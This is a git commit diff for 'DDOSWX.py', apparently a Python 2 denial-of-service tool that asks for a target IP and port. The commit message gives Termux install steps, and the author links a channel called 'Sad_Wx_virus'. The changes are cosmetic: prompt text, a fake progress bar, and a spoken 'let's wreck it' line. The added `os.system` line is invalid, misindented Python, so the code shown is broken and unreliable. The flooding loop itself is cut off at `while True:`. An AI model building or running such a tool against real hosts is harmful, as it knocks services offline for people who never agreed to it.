d2d7a35d65ffbd9618155c3793b8e2dec79faeb9
Wxsad <93474444+WIROUX@users.noreply.github.com>
2022-01-08 16:34:01 +0330

    Update DDOSWX.py
    apt update && apt upgrade -y
    pkg install python2 -y
    pkg install git -y
    pkg install figlet -y
    pkg install espeak -y
    and run this tool with cd DDOSWX
    chmod +x README.md
    python2 DDOSWX.py

--- DDOSWX.py
+++ DDOSWX.py
@@ -22,8 +22,8 @@ print "macker   : WX"
 print "telegram : https://t.me/Sad_Wx_virus"
 print "github   : https://github.com/WIROUX"
 print
-ip = raw_input("IP Target : ")
-port = input("Port        : ")
+ip = raw_input("IP Target -==>> ")
+port = input("Port        -==>> ")
 
 os.system("clear")
 os.system("figlet DDos WX")
@@ -38,7 +38,7 @@ print "[>>>>>>>>>>>>>>>-----] 75%"
 time.sleep(4)
 print "[>>>>>>>>>>>>>>>>>>>>] 100%"
 print "GO GO GO"
-espeak "berim sickesh konim"
+     os.system(espeak "berim sickesh konim")
 time.sleep(3)
 sent = 0
 while True:
